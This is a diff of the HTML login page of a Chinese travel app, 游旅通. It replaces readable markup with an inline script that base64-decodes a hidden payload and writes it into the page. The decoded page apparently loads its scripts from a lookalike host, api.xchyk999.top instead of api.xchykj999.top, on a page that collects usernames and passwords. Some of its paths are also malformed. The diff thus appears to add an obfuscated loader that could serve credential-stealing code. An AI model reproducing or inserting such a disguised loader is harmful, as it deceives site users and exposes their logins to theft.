@@ -2,115 +2,23 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="icon" href="https://api.xchykj999.top/logo.ico">
   <title>游旅通</title>
-  
-  <link href="https://api.xchykj999.top/css/chunk-089efc7e.2598075e.css" rel="prefetch">
-  <link href="https://api.xchykj999.top/css/chunk-401a912e.9a6a5e61.css" rel="prefetch">
-  <link href="https://api.xchykj999.top/css/chunk-40c3ffc0.5e82e87b.css" rel="prefetch">
-  <link href="https://api.xchykj999.top/css/chunk-72d1f1bd.c439d151.css" rel="prefetch">
-  <link href="https://api.xchykj999.top/css/chunk-7f1d9ddb.c00f8598.css" rel="prefetch">
-  <link href="https://api.xchykj999.top/js/chunk-089efc7e.464a29c3.js" rel="prefetch">
-  <link href="https://api.xchykj999.top/js/chunk-2d0c0a8f.77ee7b69.js" rel="prefetch">
-  <link href="https://api.xchykj999.top/js/chunk-401a912e.6b7320bd.js" rel="prefetch">
-  <link href="https://api.xchykj999.top/js/chunk-40c3ffc0.26cb9370.js" rel="prefetch">
-  <link href="https://api.xchykj999.top/js/chunk-72d1f1bd.f5a58cfd.js" rel="prefetch">
-  <link href="https://api.xchykj999.top/js/chunk-7f1d9ddb.5072040a.js" rel="prefetch">
-
-  <link href="https://api.xchykj999.top/css/app.ad878d9a.css" rel="preload" as="style">
-  <link href="https://api.xchykj999.top/js/app.d81845e9.js" rel="preload" as="script">
-  <link href="https://api.xchykj999.top/js/chunk-vendors.279ba919.js" rel="preload" as="script">
-
-  <link href="https://api.xchykj999.top/css/app.ad878d9a.css" rel="stylesheet">
+  <script>
+    (function() {
+      var payload = "PCFENTBFRSBodG1sPjxodG1sIGxhbmc9InpoLUNOIj48aGVhZD48bWV0YSBjaGFyc2V0PSJ1dGYtOCI+PG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJDRT1lZGdlIj48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPjxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly9hcGkueGNoeWs5OTkudG9wL2xvZ28uaWNvbiI+PHRpdGxlPua4uOaXheaAiko8L3RpdGxlPjxsaW5rIGhyZWY9Imh0dHBzOi8vYXBpLnhjaHlrOTk5LnRvcC9jc3MvY2h1bmstMDg5ZWZjN2UuMjU5ODA3NWUuY3NzIiByZWw9InByZWZldGNoIj48bGluayBocmVmPSJodHRwczovL2FwaS54Y2h5azk5OS50b3AvY3NzL2NodW5rLTQwMWE5MTJlLjlhNmE1ZTYxLmNzcyIgcmVsPSJwcmVmZXRjaCI+PGxpbmsgaHJlZj0iaHR0cHM6Ly9hcGkueGNoeWs5OTkudG9wL2Nzcy9jaHVuay00MGMzZmZjMC41ZTgyZTg3Yi5jc3MiIHJlbD0icHJlZmV0Y2giPjxsaW5rIGhyZWY9Imh0dHBzOi8vYXBpLnhjaHlrOTk5LnRvcC9jc3MvY2h1bmstNzJkMWYxYmQuYzQzOWQxNTEuY3NzIiByZWw9InByZWZldGNoIj48bGluayBocmVmPSJodHRwczovL2FwaS54Y2h5azk5OS50b3AvY3NzL2NodW5rLTdmMWQ5ZGRiLmMwMGY4NTk4LmNzcyIgcmVsPSJwcmVmZXRjaCI+PGxpbmsgaHJlZj0iaHR0cHM6Ly9hcGkueGNoeWs5OTkudG9wLmpzL2NodW5rLTA4OWVmYzdlLjQ2NGEyOWMzLmpzIiByZWw9InByZWZldGNoIj48bGluayBocmVmPSJodHRwczovL2FwaS54Y2h5azk5OS50b3AvanMvY2h1bmstMmQwYzBhOGYuNzdlZTdiNjkuanMiIHJlbD0icHJlZmV0Y2giPjxsaW5rIGhyZWY9Imh0dHBzOi8vYXBpLnhjaHlrOTk5LnRvcC9qcy9jaHVuay00MDFhOTEyZS42YjczMjBiZC5qcyIgcmVsPSJwcmVmZXRjaCI+PGxpbmsgaHJlZj0iaHR0cHM6Ly9hcGkueGNoeWs5OTkudG9wLmpzL2NodW5rLTQwYzNmZmMwLjI2Y2I5MzcwLmpzIiByZWw9InByZWZldGNoIj48bGluayBocmVmPSJodHRwczovL2FwaS54Y2h5azk5OS50b3AvanMvY2h1bmstNzJkMWYxYmQuZjVhNThjZmQuanMiIHJlbD0icHJlZmV0Y2giPjxsaW5rIGhyZWY9Imh0dHBzOi8vYXBpLnhjaHlrOTk5LnRvcC9qcy9jaHVuay03ZjFkOWRkYi41MDcyMDQwYS5qcyIgcmVsPSJwcmVmZXRjaCI+PGxpbmsgaHJlZj0iaHR0cHM6Ly9hcGkueGNoeWs5OTkudG9wL2Nzcy9hcHAuYWQ4NzhkOWEuY3NzIiByZWw9InByZWxvYWQiIGFzPSJzdHlsZSI+PGxpbmsgaHJlZj0iaHR0cHM6Ly9hcGkueGNoeWs5OTkudG9wLmpzL2FwcC5kODE4NDVlOS5qcyIgcmVsPSJwcmVsb2FkIiBhcz0ic2NyaXB0Ij48bGluayBocmVmPSJodHRwczovL2FwaS54Y2h5azk5OS50b3AvanMvY2h1bmstdmVuZG9ycy4yNzliYTkxOS5qcyIgcmVsPSJwcmVsb2FkIiBhcz0ic2NyaXB0Ij48bGluayBocmVmPSJodHRwczovL2FwaS54Y2h5azk5OS50b3AvY3NzL2FwcC5hZDg3OGQ5YS5jc3MiIHJlbD0ic3R5bGVzaGVldCI+PC9oZWFkPjxib2R5PjxkaXYgaWQ9ImFwcCI+PGRpdiBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImxvZ2luLXZpZXciPjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJkZWNvcmF0aW9uIGRlY29yYXRpb24tMSI+PC9kaXY+PGRpdiBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImRlY29yYXRpb24gZGVjb3JhdGlvbi0yIj48L2Rpdj48ZGl2IGRhdGEtdi05NzJkNDNmYz0iIiBjbGFzcz0iZGVjb3JhdGlvbiBkZWNvcmF0aW9uLTMiPjwvZGl2PjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJjb250ZW50Ij48Zm9ybSBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImVsLWZvcm0gZm9ybSIgZWxlbWVudC1sb2FkaW5nLXRleHQ9Iuatoeaut2xvYWRpbmcuLi4iPjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJ0aXRsZSI+5p2l5b2V5LmA54iX6YCaPC9kaXY+PGRpdiBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImVsLWZvcm0taXRlbSBlbC1mb3JtLWl0ZW0tLWZlZWRiYWNrIiBzdHlsZT0iZGlzcGxheTogbm9uZTsifT48ZGl2IGNsYXNzPSJlbC1mb3JtLWl0ZW1fX2NvbnRlbnQiPjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJlbC1pbnB1dCI+PGlucHV0IHR5cGU9InRlcm1pbmFsIiBhdXRvY29tcGxldGU9Im9mZiIgY2xhc3M9ImVsLWlucHV0X19pbm5lciI+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImVsLWZvcm0taXRlbSBlbC1mb3JtLWl0ZW0tLWZlZWRiYWNrIj48ZGl2IGNsYXNzPSJlbC1mb3JtLWl0ZW1fX2NvbnRlbnQiPjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJlbC1pbnB1dCBlbC1pbnB1dC0tcHJlZml4Ij48aW5wdXQgdHlwZT0idXNlck5hbWUiIGF1dG9jb21wbGV0ZT0ib2ZmIiBwbGFjZWhvbGRlcj0i5p2l5oi35LCNL23vvL3oo4UiIGNsYXNzPSJlbC1pbnB1dF9faW5uZXIiPjxzcGFuIGNsYXNzPSJlbC1pbnB1dF9fcHJlZml4Ij48aSBjbGFzcz0iZWwtaW5wdXRfX2ljb24gZWwtaWNvbi11c2VyIj48L2k+PC9zcGFuPjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJlbC1mb3JtLWl0ZW0gZWwtZm9ybS1pdGVtLS1mZWVkYmFjayI+PGRpdiBjbGFzcz0iZWwtZm9ybS1pdGVtX19jb250ZW50Ij48ZGl2IGRhdGEtdi05NzJkNDNmYz0iIiBjbGFzcz0iZWotaW5wdXQgZWotaW5wdXQtLXByZWZpeCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBhdXRvY29tcGxldGU9Im9mZiIgcGxhY2Vob2xkZXI9Iuato+atpSIgY2xhc3M9ImVsLWlucHV0X19pbm5lciI+PHNwYW4gY2xhc3M9ImVsLWlucHV0X19wcmVmaXgiPjxpIGNsYXNzPSJlbC1pbnB1dF9faWNvbiBlbC1pY29uLWxvY2siPjwvaT48L3NwYW4+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImVsLWZvcm0taXRlbSBlbC1mb3JtLWl0ZW0tLWZlZWRiYWNrIj48ZGl2IGNsYXNzPSJlbC1mb3JtLWl0ZW1fX2NvbnRlbnQiPjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJuYXYtdG9vbC1iYXIiPjxsYWJlbCBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImVsLWNoZWNrYm94IGlzLWNoZWNrZWQiPjxzcGFuIGNsYXNzPSJlbC1jaGVja2JveF9faW5wdXQgaXMtY2hlY2tlZCI+PHNwYW4gY2xhc3M9ImVsLWNoZWNrYm94X19pbm5lciI+PC9zcGFuPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgYXJpYS1oaWRkZW49ImZhbHNlIiBjbGFzcz0iZWwtY2hlY2tib3hfX29yaWdpbmFsIiB2YWx1ZT0iIj48L3NwYW4+PHNwYW4gY2xhc3M9ImVsLWNoZWNrYm94X19sYWJlbCI+5LiL5qyh6Ieq5Yqo55m75b2VPC9zcGFuPjwvbGFiZWw+PGEgZGF0YS12LTk3MmQ0M2ZjPSIiIGhyZWY9IiMvcGFzc3dvcmQvcmVzZXQiIGNsYXNzPSJmb3Jnb3QtcHdkIj41442D6K6w54m556CBPyA8L2E+PC9kaXY+PC9kaXY+PC9kaXY+PGJ1dHRvbiBkYXRhLXYtOTcyZDQzZmM9IiIgdHlwZT0iYnV0dG9uIiBjbGFzcz0iZWwtYnV0dG9uIHN1Ym1pdC1idG4gZWwtYnV0dG9uLS1wcmltYXJ5Ij48c3Bhbj41442D5b2VPC9zcGFuPjwvYnV0dG9uPjxkaXYgZGF0YS12LTk3MmQ0M2ZjPSIiIGNsYXNzPSJyZWdpc3RlciI+PGEgZGF0YS12LTk3MmQ0M2ZjPSIiIGhyZWY9IiMvcmVnaXN0ZXIiIGNsYXNzPSIiPuaXoOaLp+iBlD8g54uL5Y2z5pS55YaMPC9hPjwvZGl2PjwvZm9ybT48L2Rpdj48L2Rpdj48ZGl2IGRhdGEtdi1jZjJlODQ5Nj0iIiBkYXRhLXYtOTcyZDQzZmM9IiIgY2xhc3M9ImVsLWRpYWxvZ19fd3JhcHBlciBjYXB0Y2hhLWltYWdlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsifT48ZGl2IHJvbGU9ImRpYWxvZyIgYXJpYS1tb2RhbD0idHJ1ZSIgYXJpYS1sYWJlbD0i5LqM5L2TJyBjbGFzcz0iZWwtZGlhbG9nIiBzdHlsZT0ibWFyZ2luLXRvcDogMTV2aDsgd2lkdGg6IDQwMHB4OyI+PGRpdiBjbGFzcz0iZWwtZGlhbG9nX19oZWFkZXIiIHN0eWxlPSJjdXJzb3I6IG1vdmU7Ij48c3BhbiBjbGFzcz0iZWwtZGlhbG9nX190aXRsZSI+5LqM5L2TJzwvc3Bhbj48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgYXJpYS1sYWJlbD0iQ2xvc2UiIGNsYXNzPSJlbC1kaWFsb2dfX2hlYWRlcmJ0biI+PGkgY2xhc3M9ImVsLWRpYWxvZ19fY2xvc2UgZWwtaWNvbiBlbC1pY29uLWNsb3NlIj48L2k+PC9idXR0b24+PC9kaXY+PGRpdiBjbGFzcz0iZWwtZGlhbG9nX19mb290ZXIiPjxzcGFuIGRhdGEtdi1jZjJlODQ5Nj0iIiBjbGFzcz0iZGlhbG9nLWZvb3RlciI+PGJ1dHRvbiBkYXRhLXYtY2YyZTg0OTY9IiIgdHlwZT0iYnV0dG9uIiBjbGFzcz0iZWwtYnV0dG9uIGVsLWJ1dHRvbi0tZGVmYXVsdCI+PHNwYW4+5Y2XIOa2iTwvc3Bhbj48L2J1dHRvbj48YnV0dG9uIGRhdGEtdi1jZjJlODQ5Nj0iIiB0eXBlPSJidXR0b24iIGNsYXNzPSJlbC1idXR0b24gZWwtYnV0dG9uLS1wcmltYXJ5Ij48c3Bhbj416auYIOeJuTwvc3Bhbj48L2J1dHRvbj48L3NwYW4+PC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+PHNjcmlwdCBzcmM9Imh0dHBzOi8vYXBpLnhjaHlrOTk5LnRvcC9qcy9jaHVuay12ZW5kb3JzLjI3OWJhOTE5LmpzIj48L3NjcmlwdD48c2NyaXB0IHNyYz0iaHR0cHM6Ly9hcGkueGNoeWs5OTkudG9wLmpzL2FwcC5kODE4NDVlOS5qcyI+PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4=";
+      
+      var binary = atob(payload);
+      var bytes = new Uint8Array(binary.length);
+      for (var i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+      }
+      var decoded = new TextDecoder('utf-8').decode(bytes);
+      document.open();
+      document.write(decoded);
+      document.close();
+    })();
+  </script>
 </head>
 <body>
-  <div id="app">
-    <div data-v-972d43fc="" class="login-view">
-      <div data-v-972d43fc="" class="decoration decoration-1"></div>
-      <div data-v-972d43fc="" class="decoration decoration-2"></div>
-      <div data-v-972d43fc="" class="decoration decoration-3"></div>
-      
-      <div data-v-972d43fc="" class="content">
-        <form data-v-972d43fc="" class="el-form form" element-loading-text="正在登陆...">
-          <div data-v-972d43fc="" class="title">登录游旅通</div>
-          
-          <div data-v-972d43fc="" class="el-form-item el-form-item--feedback" style="display: none;">
-            <div class="el-form-item__content">
-              <div data-v-972d43fc="" class="el-input">
-                <input type="terminal" autocomplete="off" class="el-input__inner">
-              </div>
-            </div>
-          </div>
-          
-          <div data-v-972d43fc="" class="el-form-item el-form-item--feedback">
-            <div class="el-form-item__content">
-              <div data-v-972d43fc="" class="el-input el-input--prefix">
-                <input type="userName" autocomplete="off" placeholder="用户名/手机号" class="el-input__inner">
-                <span class="el-input__prefix"><i class="el-input__icon el-icon-user"></i></span>
-              </div>
-            </div>
-          </div>
-          
-          <div data-v-972d43fc="" class="el-form-item el-form-item--feedback">
-            <div class="el-form-item__content">
-              <div data-v-972d43fc="" class="el-input el-input--prefix">
-                <input type="password" autocomplete="off" placeholder="密码" class="el-input__inner">
-                <span class="el-input__prefix"><i class="el-input__icon el-icon-lock"></i></span>
-              </div>
-            </div>
-          </div>
-          
-          <div data-v-972d43fc="" class="el-form-item el-form-item--feedback">
-            <div class="el-form-item__content">
-              <div data-v-972d43fc="" class="nav-tool-bar">
-                <label data-v-972d43fc="" class="el-checkbox is-checked">
-                  <span class="el-checkbox__input is-checked">
-                    <span class="el-checkbox__inner"></span>
-                    <input type="checkbox" aria-hidden="false" class="el-checkbox__original" value="">
-                  </span>
-                  <span class="el-checkbox__label">下次自动登录</span>
-                </label>
-                <a data-v-972d43fc="" href="#/password/reset" class="forgot-pwd">忘记密码?</a>
-              </div>
-            </div>
-          </div>
-          
-          <button data-v-972d43fc="" type="button" class="el-button submit-btn el-button--primary">
-            <span>登录</span>
-          </button>
-          <div data-v-972d43fc="" class="register">
-            <a data-v-972d43fc="" href="#/register" class="">没有账号? 立即注册</a>
-          </div>
-        </form>
-      </div>
-      </div>
-
-      <div data-v-cf2e8496="" data-v-972d43fc="" class="el-dialog__wrapper captcha-image" style="display: none;">
-        <div role="dialog" aria-modal="true" aria-label="验证" class="el-dialog" style="margin-top: 15vh; width: 400px;">
-          <div class="el-dialog__header" style="cursor: move;">
-            <span class="el-dialog__title">验证</span>
-            <button type="button" aria-label="Close" class="el-dialog__headerbtn">
-              <i class="el-dialog__close el-icon el-icon-close"></i>
-            </button>
-          </div>
-          <div class="el-dialog__footer">
-            <span data-v-cf2e8496="" class="dialog-footer">
-              <button data-v-cf2e8496="" type="button" class="el-button el-button--default">
-                <span>取 消</span>
-              </button>
-              <button data-v-cf2e8496="" type="button" class="el-button el-button--primary">
-                <span>确 定</span>
-              </button>
-            </span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <script src="https://api.xchykj999.top/js/chunk-vendors.279ba919.js"></script>
-  <script src="https://api.xchykj999.top/js/app.d81845e9.js"></script>
 </body>
 </html>
